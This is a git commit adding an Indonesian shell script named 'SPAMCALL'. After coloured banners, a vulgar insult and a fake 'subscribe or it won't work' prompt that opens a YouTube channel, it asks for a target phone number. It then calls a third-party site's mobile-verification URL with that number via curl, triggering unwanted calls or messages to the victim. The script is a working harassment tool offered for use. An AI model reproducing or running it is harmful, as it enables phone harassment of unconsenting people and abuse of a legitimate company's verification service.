c893fe08ab257e958bbb52c0cb9dbebfea86e048
MrAdiaraaa-087 <87253374+MrAdiaraaa-087@users.noreply.github.com>
2021-07-16 14:52:12 +0700

    Add files via upload

---
+++ mm.sh
@@ -0,0 +1,74 @@
+#!/bin/sh
+
+clear
+
+
+
+
+
+
+
+# code warna
+biru="\033[1;96m"
+kuning="\033[1;93m"
+merah="\033[1;91m"
+hijau="\033[1;92m"
+abu2="\033[1;90m"
+ungu="\033[1;95m"
+sleep 1
+echo "${merah}WARNING!!"
+sleep 1
+echo "${merah}GUNAKAN TOOLS INI DENGAN BIJAK!!!!"
+sleep 5
+echo "KONTOL BAPAK KAU GEDE" | lolcat
+clear
+sleep 1
+    echo "${hijau}SEKEDAR INFO"
+sleep 2
+    echo "${hijau}APABILA TIDAK ${abu2}( ${merah}SUBSCRIBE ${abu2})"
+sleep 2
+    echo "${hijau}MAKA SCRIPT TIDAK AKAN WORK!!!"
+sleep 5
+xdg-open https://youtube.com/channel/UCNQkO9tExI96rTrwIE2nKzg
+sleep 10
+echo "${hijau}Hehehe, Canda Ngab"
+sleep 2
+echo "${biru}( MAKASIH UDAH SUBS )"
+sleep 5
+clear
+# code warna
+biru="\033[1;96m"
+kuning="\033[1;93m"
+merah="\033[1;91m"
+hijau="\033[1;92m"
+abu2="\033[1;90m"
+ungu="\033[1;95m"
+echo "${abu2}            < ${biru}/ ${abu2}> ${merah}SPAMCALL ${abu2}< ${biru}\ ${abu2}>"
+sleep 1
+echo " ${biru}+${abu2}=========================================${biru}+"
+sleep 1
+echo " ${abu2}[${biru}•${abu2}] ${hijau}Author : ${kuning}MR Adiaraaa"
+sleep 1
+echo " ${abu2}[${biru}•${abu2}] ${hijau}Team   : ${kuning}Cyber Attack"
+sleep 1
+echo " ${abu2}[${biru}•${abu2}] ${hijau}Wa     : ${kuning}081546772792"
+sleep 1
+echo " ${abu2}[${biru}•${abu2}] ${hijau}Github : ${kuning}https://github.com/MrAdiaraaa"
+sleep 1
+echo " ${biru}×${abu2}≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠${biru}×"
+sleep 1
+echo " ${abu2}[${biru}•${abu2}] ${hijau}1${biru}.${kuning} GASS SPAM"
+sleep 1
+echo " ${abu2}[${biru}•${abu2}] ${hijau}2${biru}.${kuning} KELUAR"
+sleep 1
+echo " ${biru}+${abu2}=========================================${biru}+"
+read -p " ┌─[MASUKKAN PILIHAN ANDA]
+ └╼> " naon
+
+if [ $naon = 1 ]
+then
+read -p " [•] NO TARGET DIAWALI 8xxx => " nomor
+link="https://id.jagreward.com/member/verify-mobile/$nomor"
+curl -s $link
+
+fi
